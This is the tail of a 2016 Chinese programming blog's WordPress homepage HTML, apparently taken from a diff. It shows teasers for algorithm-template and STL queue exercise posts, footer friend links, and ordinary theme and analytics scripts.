+<p> <a href="http://www.urlteam.org/2016/05/acm%e7%ae%97%e6%b3%95%e6%a8%a1%e6%9d%bf%e6%94%b6%e8%97%8f-%e6%94%af%e6%8c%81%e5%85%8d%e8%b4%b9%e4%b8%8b%e8%bd%bd/#more-864" class="more-link">[&#8230;]</a></p>
+</div></div><!-- .latestnews-box"> --><div class="col-sm-3 latestnews-box"><div class="latestnews-img"><a class="latestnews-img-a" href="http://www.urlteam.org/2016/05/%e9%93%b6%e8%a1%8c%e4%b8%9a%e5%8a%a1%e9%98%9f%e5%88%97%e7%ae%80%e5%8d%95%e6%a8%a1%e6%8b%9f-stl%e9%98%9f%e5%88%97-%e9%a2%98%e8%a7%a3/" title="银行业务队列简单模拟 STL队列 题解"><img width="250" height="250" src="http://www.urlteam.org/wp-content/uploads/2016/04/20131129171921-858538104-250x250.png" class="attachment-post-thumbnail size-post-thumbnail wp-post-image" alt="20131129171921-858538104" srcset="http://www.urlteam.org/wp-content/uploads/2016/04/20131129171921-858538104-150x150.png 150w, http://www.urlteam.org/wp-content/uploads/2016/04/20131129171921-858538104-250x250.png 250w, http://www.urlteam.org/wp-content/uploads/2016/04/20131129171921-858538104-174x174.png 174w" sizes="(max-width: 250px) 100vw, 250px" /></a></div><div class="latesnews-content"><h3 class="latestnews-title"><a href="http://www.urlteam.org/2016/05/%e9%93%b6%e8%a1%8c%e4%b8%9a%e5%8a%a1%e9%98%9f%e5%88%97%e7%ae%80%e5%8d%95%e6%a8%a1%e6%8b%9f-stl%e9%98%9f%e5%88%97-%e9%a2%98%e8%a7%a3/" title="银行业务队列简单模拟 STL队列 题解">银行业务队列简单模拟 STL队列 题解</a></h3><header>题目链接:https://pta.patest.cn/pta/test/15/exam/4/question/825</header>
+<header>队列比较简单,就附上队列的基本信息加源代码.</header>
+<header></header>
+<p> <a href="http://www.urlteam.org/2016/05/%e9%93%b6%e8%a1%8c%e4%b8%9a%e5%8a%a1%e9%98%9f%e5%88%97%e7%ae%80%e5%8d%95%e6%a8%a1%e6%8b%9f-stl%e9%98%9f%e5%88%97-%e9%a2%98%e8%a7%a3/#more-859" class="more-link">[&#8230;]</a></p>
+</div></div><!-- .latestnews-box"> --><div class="clear"></div></div></div><!-- .carousel-inner --><a class="left carousel-control" href="#carousel-homepage-latestnews" role="button" data-slide="prev"><span class="glyphicon glyphicon-chevron-left" aria-hidden="true"></span><span class="sr-only">Previous</span></a><a class="right carousel-control" href="#carousel-homepage-latestnews" role="button" data-slide="next"><span class="glyphicon glyphicon-chevron-right" aria-hidden="true"></span><span class="sr-only">Next</span></a></div><!-- #carousel-homepage-latestnews --></div><!-- .container --></section>
+</div><!-- .site-content -->
+
+<footer id="footer" role="contentinfo">
+
+
+<div class="container">
+
+	<div class="col-md-3 company-details"><div class="icon-top red-text"><img src="http://www.urlteam.org/wp-content/themes/zerif-lite/images/map25-redish.png" alt="" /></div><div class="zerif-footer-address">Company address</div></div><div class="col-md-3 company-details"><div class="icon-top green-text"><img src="http://www.urlteam.org/wp-content/themes/zerif-lite/images/envelope4-green.png" alt="" /></div><div class="zerif-footer-email">友链<br />
+帅武：<a href="http://www.xudadablog.cn/">www.xudadablog.cn</a>
+<br />亚林：<a href="http://www.chengyalin.cn/">www.chengyalin.cn</a><br />
+刘鑫：<a href="http://www.myvary.cn/">www.myvary.cn</a><br />
+陈伟：<a href="http://www.copie.cn/">www.copie.cn</a>
+</div></div><div class="col-md-3 company-details"><div class="zerif-footer-phone"><a href=" ">备案号：<br /><br />
+浙ICP备15009558号-1 </a></div></div><div class="col-md-3 copyright"><ul class="social"><li><a target="_blank" href="#"><i class="fa fa-facebook"></i></a></li><li><a target="_blank" href="#"><i class="fa fa-twitter"></i></a></li><li><a target="_blank" href="#"><i class="fa fa-linkedin"></i></a></li><li><a target="_blank" href="#"><i class="fa fa-behance"></i></a></li><li><a target="_blank" href="#"><i class="fa fa-dribbble"></i></a></li></ul><div class="zerif-copyright-box"><a class="zerif-copyright" href="http://themeisle.com/themes/zerif-lite/" target="_blank" rel="nofollow">Zerif Lite </a>powered by<a class="zerif-copyright" href="http://wordpress.org/" target="_blank" rel="nofollow"> WordPress</a></div></div>
+</div> <!-- / END CONTAINER -->
+
+</footer> <!-- / END FOOOTER  -->
+
+
+	</div><!-- mobile-bg-fix-whole-site -->
+</div><!-- .mobile-bg-fix-wrap -->
+
+
+<script type='text/javascript' src='http://www.urlteam.org/wp-content/themes/zerif-lite/js/bootstrap.min.js?ver=20120206'></script>
+<script type='text/javascript' src='http://www.urlteam.org/wp-content/themes/zerif-lite/js/jquery.knob.js?ver=20120206'></script>
+<script type='text/javascript' src='http://www.urlteam.org/wp-content/themes/zerif-lite/js/smoothscroll.js?ver=20120206'></script>
+<script type='text/javascript' src='http://www.urlteam.org/wp-content/themes/zerif-lite/js/scrollReveal.js?ver=20120206'></script>
+<script type='text/javascript' src='http://www.urlteam.org/wp-content/themes/zerif-lite/js/zerif.js?ver=20120206'></script>
+<script type='text/javascript' src='http://www.urlteam.org/wp-content/themes/zerif-lite/js/parallax.js?ver=v1'></script>
+<script type='text/javascript'>
+/* <![CDATA[ */
+var SlimStatParams = {"ajaxurl":"http:\/\/www.urlteam.org\/wp-admin\/admin-ajax.php","async_tracker":"false","extensions_to_track":"pdf,doc,xls,zip","outbound_classes_rel_href_to_not_track":"noslimstat,ab-item","ci":"YToxOntzOjEyOiJjb250ZW50X3R5cGUiO3M6NDoiaG9tZSI7fQ==.05a376179b1fbf666d7c037d8299f247"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='http://cdn.jsdelivr.net/wp/wp-slimstat/trunk/wp-slimstat.min.js'></script>
+<script type='text/javascript' src='http://www.urlteam.org/wp-includes/js/wp-embed.min.js?ver=4.4.3'></script>
+
+</body>
+
+</html>
